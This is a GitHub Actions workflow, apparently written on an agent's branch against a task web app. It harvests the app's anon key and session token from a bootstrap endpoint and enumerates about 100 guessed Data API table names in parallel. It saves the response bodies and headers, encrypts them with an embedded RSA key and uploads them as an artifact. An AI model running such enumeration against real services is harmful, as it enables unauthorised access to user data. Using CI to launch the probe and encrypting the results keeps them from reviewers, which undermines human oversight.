name: launchlet-part2-token-probe

on:
  push:
    branches: [agent/launchlet-part2-token-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Discover deploy-related Data API tables and encrypt hits
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json, concurrent.futures
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
          root=boot['api']['dataApiBase'].rstrip('/')+'/'
          auth={'Accept':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
          tables=[
            'deploy','deploys','deployment','deployments','deploy_refs','deployment_refs','deploy_references','deployment_references','preview_deploys','preview_deployments','deploy_previews','deployment_previews','preview_deploy_refs','preview_deployment_refs',
            'deploy_records','deployment_records','deployments_view','deployment_view','deploy_view','preview_deploy_view','preview_deployments_view','deploy_inspector','deployment_inspector','deploy_inspections','deployment_inspections','deploy_metadata','deployment_metadata','deploy_meta','deployment_meta',
            'deploy_jobs','deployment_jobs','preview_jobs','release_jobs','publish_jobs','deploy_queue','deployment_queue','preview_queue','release_queue','publish_queue','deploy_targets','deployment_targets','release_targets','preview_targets','publish_targets',
            'releases','release','release_records','release_deploys','release_deployments','release_previews','release_refs','release_references','publishes','publications','publish_deploys','published_deploys','preview_releases',
            'environments','environment','project_environments','deploy_environments','deployment_environments','preview_environments','release_environments','build_deploys','build_deployments','project_deploys','project_deployments','workspace_deploys','workspace_deployments',
            'server_actions','server_references','action_refs','action_references','runtime_refs','runtime_references','preview_contexts','preview_sessions','preview_capabilities','deploy_contexts','deployment_contexts','launches','launchlet_deploys','launchlet_deployments','artifacts','build_artifacts','deploy_artifacts','release_artifacts'
          ]
          tables=list(dict.fromkeys(tables))
          def probe(t):
              try:
                  r=requests.get(urllib.parse.urljoin(base,root+t+'?select=*'),headers={**auth,'User-Agent':'Mozilla/5.0'},timeout=8,allow_redirects=False)
                  if r.status_code!=404:
                      return {'table':t,'status':r.status_code,'body':r.text[:20000],'headers':dict(r.headers)}
              except Exception: pass
          hits=[]
          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
              for x in ex.map(probe,tables):
                  if x: hits.append(x)
          (out/'summary.json').write_text(json.dumps({'count':len(tables),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-tables-encrypted
          path: artifact/
          retention-days: 1
